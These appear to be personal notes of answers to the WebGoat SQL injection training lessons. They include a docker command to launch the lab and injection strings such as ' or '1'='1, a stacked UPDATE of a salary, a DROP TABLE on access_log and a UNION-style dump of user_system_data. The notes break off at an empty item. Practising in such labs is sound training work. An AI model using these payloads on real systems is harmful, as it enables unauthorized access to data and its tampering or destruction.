sudo docker run -p 8080:8080 --name webgoat --rm -it -v ~/webgoat-data:/home/webgoat/.webgoat-8.0-8088465 webgoat/webgoat-8.0:latest
http://34.70.4.78:8080/WebGoat/login

-- SQL Injection (intro)
1. select department from employees where last_name = 'Franco';
2. update employees set department = 'Sales' where userid = '89762'; 
3. alter table employees add phone varchar(20);
4. grant alter table to 'UnauthorizedUser';
9. SELECT * FROM user_data WHERE first_name = 'John' AND last_name = 'Smith or 1 = 1';	
10. Login_Count field = 0 and User_Id field = 0 or 1=1;
11. For both fields ' or '1' = '1;
12. Employee name field = anything AuthTan ='; UPDATE employees SET salary=99999 WHERE first_name='John
13. %'; DROP TABLE access_log;--;

-- SQL Injection (advanced)
3. '; SELECT * FROM user_system_data;-- Dave's Password: passW0rD
5. 
